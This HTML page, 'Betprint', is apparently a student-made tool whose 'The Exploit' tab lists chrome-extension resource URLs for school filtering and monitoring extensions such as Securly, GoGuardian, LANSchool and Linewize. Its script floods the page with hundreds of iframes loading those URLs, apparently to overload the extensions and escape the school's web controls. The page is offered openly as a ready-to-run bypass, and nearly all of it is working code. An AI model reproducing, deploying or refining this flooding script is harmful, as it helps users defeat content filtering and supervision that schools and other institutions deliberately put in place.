<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Betprint</title>
<!-- Meta tags omitted for brevity -->
<style>
@import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
* {
  font-family: "Roboto", Arial, sans-serif;
}
body {
  background-color: #1a2852;
  color: white;
  display: flex;
  margin: 0;
  height: 100vh;
  font-family: "Roboto", Arial, sans-serif;
}
/* Side panel styles */
.side-panel {
  position: fixed;
  top: 0; left: 0;
  width: 250px;
  height: 100vh;
  background-color: #656770;
  display: flex;
  flex-direction: column;
  padding: 20px;
  border-right: 1px solid #444;
  box-sizing: border-box;
}
.side-panel img {
  width: 50px; height: 50px; margin-right: 10px;
}
.side-panel h2 {
  font-weight: bold; margin-bottom: 40px;
}
.option {
  margin: 10px 0;
  font-size: 18px;
  cursor: pointer;
  padding: 10px;
  border-radius: 8px;
  transition: background 0.2s;
}
.option:hover {
  background-color: #062a73;
}
.option.active {
  background-color: #8ab4f8;
  color: blue;
}
/* Main content styles */
.main-content {
  margin-left: 250px;
  padding: 20px;
  flex: 1;
  overflow-y: auto;
}
#printer-tab, #about-tab, #settings-tab {
  display: none;
}
#printer-tab.active, #about-tab.active, #settings-tab.active {
  display: block;
}

/* Extension container styles */
.extension-container {
  background: #3763e6;
  padding: 10px;
  border-radius: 10px;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
}
.extension-info {
  display: flex; align-items: center;
}
.extension-info img {
  width: 40px; height: 40px; border-radius: 50%; margin-right: 10px;
}
.extension-name {
  font-size: 13px;
}
.extension-id {
  font-size: 11px; color: #c4c7c5; margin-left: 8px;
}
button {
  background: transparent; color: #9dbae9; border: 1px solid #047db7; border-radius: 20px;
  padding: 7px 10px; cursor: pointer; transition: background 0.2s;
}
button:hover {
  background: #38393b;
}
</style>
</head>
<body>
<!-- Side Panel -->
<div class="side-panel">
  <div style="display:flex; align-items:center;">
    <img src="https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/icon.png" alt="Icon" />
    <h2>Betprint</h2>
  </div>
  <div class="option active" data-name="printer-tab">The Exploit</div>
  <div class="option" data-name="settings-tab">Settings</div>
  <div class="option" data-name="about-tab">About</div>
  <div style="border-top:1px solid #444; margin-top:10px; padding-top:10px; width:100%;"></div>
  <p style="text-align:center; margin-left:-10px;">Made by <a href="https://github.com/blookethackerlol2/" target="_blank" style="color:#9dbae9;">someone</a></p>
</div>

<!-- Main Content -->
<div class="main-content">
  <div id="printer-tab" class="tab active">
    <h3>All Extensions</h3>
    <div id="div-container"></div>
    <button id="start-flood" style="margin-top:10px;">Start Flooding Extensions</button>
  </div>
  <div id="about-tab" class="tab" style="display:none;">
    <h2>About Betprint</h2>
    <p>Betprint is an exploit created by ...</p>
  </div>
  <div id="settings-tab" class="tab" style="display:none;">
    <h2>Settings</h2>
    <!-- Your settings here -->
  </div>
</div>

<!-- Scripts -->
<script>
  // Tab switching
  document.querySelectorAll('.option').forEach(opt => {
    opt.addEventListener('click', () => {
      document.querySelectorAll('.option').forEach(o => o.classList.remove('active'));
      opt.classList.add('active');

      const name = opt.getAttribute('data-name');
      document.querySelectorAll('.tab').forEach(tab => {
        tab.style.display = 'none';
      });
      document.getElementById(name).style.display = 'block';
    });
  });

  // List of extensions (your original list)
  const extensions = {
    "no-direct-ip": "chrome-extension://hacaeeoapmdgmhifjcgbblcobgnmceff/icons/block.png",
    "Securly (4th ID)": "chrome-extension://lcgajdcbmhepemmlpemkkpgagieehmjp/fonts/Metropolis.css",
    "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
    "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
    "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
    "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
    "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
    "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
    // ... (rest of your extension list)
  };

  // Function to flood extension URLs with iframes
  function floodExtensions() {
    const container = document.getElementById("div-container");
    container.innerHTML = ""; // clear previous

    for (const [name, url] of Object.entries(extensions)) {
      // Create extension block
      const extDiv = document.createElement("div");
      extDiv.className = "extension-container";

      extDiv.innerHTML = `
        <div class="extension-info">
          <img src="${extensions[name].startsWith('http') ? extensions[name] : 'https://via.placeholder.com/40'}" alt="${name}">
          <div>
            <div class="extension-name">${name}</div>
            <div class="extension-id">${url}</div>
          </div>
        </div>
      `;

      container.appendChild(extDiv);
    }

    // Flood with iframes
    const iframeCount = 100; // Or get from slider
    for (let i = 0; i < iframeCount; i++) {
      for (const url of Object.values(extensions)) {
        const iframe = document.createElement("iframe");
        iframe.src = url;
        iframe.style.width = "25px";
        iframe.style.height = "25px";
        iframe.style.border = "none";
        document.body.appendChild(iframe); // or a specific container
      }
    }
  }

  document.getElementById("start-flood").addEventListener("click", () => {
    floodExtensions();
  });
</script>
</body>
</html>
